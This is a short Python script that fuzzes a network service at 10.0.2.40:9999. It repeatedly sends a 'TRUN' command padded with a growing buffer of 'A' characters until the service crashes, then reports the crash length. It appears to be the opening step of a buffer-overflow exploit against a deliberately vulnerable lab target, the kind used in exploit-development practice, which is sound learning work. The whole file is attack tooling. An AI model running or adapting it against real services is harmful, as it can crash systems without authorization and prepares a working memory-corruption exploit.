#!/usr/bin/python3
import sys, socket
from time import sleep

buffer = b"A" * 100

try:
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			s.connect(('10.0.2.40', 9999))
			
		
			payload = b'TRUN /:./' + buffer
			s.send(payload)
		
			sleep(2)
		
			buffer = buffer + b"A" * 100
	
		except Exception as e:
			print(f"Fuzzing crashed at {len(buffer)} bytes")
			print(f"Error: {e}")
			sys.exit()
		finally:
			s.close()
		
except KeyboardInterrupt:
		print("\nFuzzing interrupted by user. Exiting...")
		print(f"Fuzzing crashed at {len(buffer)} bytes")
		sys.exit()
